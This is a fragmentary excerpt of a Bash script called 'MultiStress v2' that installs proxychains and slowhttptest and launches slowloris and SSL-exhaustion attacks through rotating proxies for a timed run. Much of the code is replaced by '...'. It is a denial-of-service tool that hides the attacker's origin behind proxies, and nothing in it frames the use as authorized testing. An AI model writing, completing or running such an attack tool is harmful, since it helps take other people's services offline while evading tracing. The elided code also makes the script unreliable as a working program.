#!/bin/bash
# MultiStress v2 — Linux, with proxy rotation
set -euo pipefail
...
install_tools() {
  ...
  if ! command -v proxychains4 &>/dev/null; then
    log "Installing proxychains4..."
    sudo apt-get install -y -qq proxychains4 2>/dev/null || \
    sudo apt-get install -y -qq proxychains 2>/dev/null || \
    warn "proxychains not available"
  fi

  sudo apt-get install -y -qq slowhttptest 2>/dev/null || true
...
def parse_proxy(p):
    ...
    if "@" in rest:
        ...
        hp = rest
    h, port = hp.rsplit(":", 1)
    ptype = socks.SOCKS5 if "socks5" in proto else socks.HTTP
    return (ptype, h, int(port), True, user, pw)
...
print("[slowloris] Done", flush=True)
EOF
...
while time.time()-start < TIMEOUT and not stop.is_set():
    ...
    time.sleep(5)
stop.set()
print(f"[ssl_exhaustion] Done. Total: {count[0]}", flush=True)
EOF
}
...
run_all() {
  ...
  while [[ $(( $(date +%s) - start_ts )) -lt $DURATION ]]; do
    ...
    local f=$(( pct * 40 / 100 ))
    printf "\r[${GREEN}%-40s${RESET}] %3d%% %ds/%ds" \
      "$(printf '#%.0s' $(seq 1 $((f>0?f:1))))$(printf -- '-%.0s' $(seq 1 $((40-f>0?40-f:1))))" \
      "$pct" "$el" "$DURATION"
    sleep 2
  done

  echo -e "\n\n${BOLD}${GREEN}[OK] Done.${RESET}\n"
  sleep 2
...
echo -e "\n${BOLD}${RED}>> MULTISTRESS v2${RESET} — Linux — proxy mode"
echo -e "   Proxies file: ${CYAN}$PROXIES_FILE${RESET}\n"
install_tools
run_all
